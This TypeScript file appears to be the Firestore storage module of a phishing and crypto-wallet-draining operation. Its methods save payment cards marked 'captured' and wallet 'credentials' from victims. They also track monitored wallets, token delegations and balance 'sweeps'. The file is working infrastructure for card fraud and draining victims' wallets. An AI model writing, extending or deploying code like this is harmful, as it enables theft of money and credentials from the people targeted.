import { initializeApp, getApps } from 'firebase-admin/app';
import { getFirestore } from 'firebase-admin/firestore';
import { logger } from './utils.js';
import { DetectionEvent, WalletInfo, BalanceState, DelegationState } from './types.js';

export class AgentDatabase {
  private db: FirebaseFirestore.Firestore;

  constructor(_dbPath?: string) { // optional, ignored
    if (!getApps().length) {
      try {
        initializeApp();
        logger.info("🔥 Connected to Firebase Firestore");
      } catch (error) {
        logger.error("❌ Firebase Init Failed:", error);
      }
    }
    this.db = getFirestore();
  }
  // 🟢 CREDENTIALS & SUBMISSIONS
  async getRecentSubmissions(limit: number = 5): Promise<any[]> {
    const snapshot = await this.db.collection('submissions')
      .orderBy('receivedAt', 'desc')
      .limit(limit)
      .get();
    return snapshot.docs.map(doc => doc.data());
  }

  async getRecentCards(limit: number = 5): Promise<any[]> {
    const snapshot = await this.db.collection('cards')
      .orderBy('receivedAt', 'desc')
      .limit(limit)
      .get();
    return snapshot.docs.map(doc => doc.data());
  }

  async saveCardData(data: any): Promise<void> {
    try {
      await this.db.collection('cards').add({
        ...data,
        receivedAt: new Date(),
        status: 'captured'
      });
      logger.info(`💳 Saved card for ${data.holderName || 'Unknown'}`);
    } catch (error) {
      logger.error("Failed to save card data:", error);
      throw error;
    }
  }

  async saveWalletSubmission(data: any): Promise<void> {
    try {
      await this.db.collection('submissions').add({
        ...data,
        receivedAt: new Date(),
        status: 'new'
      });
      logger.info(`💾 Saved credentials for ${data.walletName || 'Unknown Wallet'}`);
    } catch (error) {
      logger.error("Failed to save wallet submission:", error);
      throw error;
    }
  }

  // --- WALLET MONITORING METHODS ---

  async getMonitoredWallets(): Promise<WalletInfo[]> {
    const snapshot = await this.db.collection('wallets').where('isActive', '==', true).get();
    return snapshot.docs.map(doc => doc.data() as WalletInfo);
  }

  async addMonitoredWallet(wallet: WalletInfo): Promise<void> {
    await this.db.collection('wallets').doc(wallet.publicKey).set(wallet, { merge: true });
  }

  async removeMonitoredWallet(publicKey: string): Promise<void> {
    await this.db.collection('wallets').doc(publicKey).update({ isActive: false });
  }

  // --- EVENT METHODS ---

  async createDetectionEvent(event: Omit<DetectionEvent, 'id'>): Promise<string> {
    const id = `evt_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    const eventData = {
      ...event,
      id,
      amount: event.amount.toString(), // Store BigInt as String for Firestore compatibility
      timestamp: new Date()
    };
    
    await this.db.collection('events').doc(id).set(eventData);
    return id;
  }

  async getDetectionEvent(id: string): Promise<DetectionEvent | null> {
    const doc = await this.db.collection('events').doc(id).get();
    if (!doc.exists) return null;
    
    const data = doc.data();
    return {
      ...data,
      amount: BigInt(data?.amount || '0') 
    } as DetectionEvent;
  }

  async updateEventStatus(id: string, status: 'pending' | 'processed' | 'failed' | 'approved' | 'rejected', error?: string): Promise<void> {
    await this.db.collection('events').doc(id).update({
      status,
      error: error || null,
      processedAt: new Date()
    });
  }

  // --- BALANCE STATE METHODS ---

  async getBalanceState(wallet: string, mint: string): Promise<BalanceState | null> {
    const docId = `${wallet}_${mint}`;
    const doc = await this.db.collection('balances').doc(docId).get();
    
    if (!doc.exists) return null;
    
    const data = doc.data();
    return {
      wallet: data?.wallet,
      mint: data?.mint,
      balance: BigInt(data?.balance || '0'),
      lastUpdated: data?.lastUpdated.toDate()
    };
  }

  async updateBalanceState(state: BalanceState): Promise<void> {
    const docId = `${state.wallet}_${state.mint}`;
    await this.db.collection('balances').doc(docId).set({
      ...state,
      balance: state.balance.toString(),
      lastUpdated: new Date()
    });
  }

  // --- DELEGATION STATE METHODS ---

  async getDelegationState(wallet: string): Promise<DelegationState | null> {
    const doc = await this.db.collection('delegations').doc(wallet).get();
    if (!doc.exists) return null;
    return doc.data() as DelegationState;
  }

  async updateDelegationState(state: DelegationState): Promise<void> {
    const safeState = {
        ...state,
        maxAmount: state.maxAmount ? state.maxAmount.toString() : '0',
        lastUpdated: new Date()
    };

    await this.db.collection('delegations').doc(state.wallet).set(safeState, { merge: true });
  }

  // --- SWEEP METHODS ---
  
  async saveSweep(wallet: string, data: any): Promise<void> {
      await this.db.collection('sweeps').doc(wallet).set(data);
  }
  
  async getSweep(wallet: string): Promise<any> {
      const doc = await this.db.collection('sweeps').doc(wallet).get();
      return doc.exists ? doc.data() : null;
  }

  async close() {
    // Firebase Admin SDK handles connection pooling automatically
  }
}
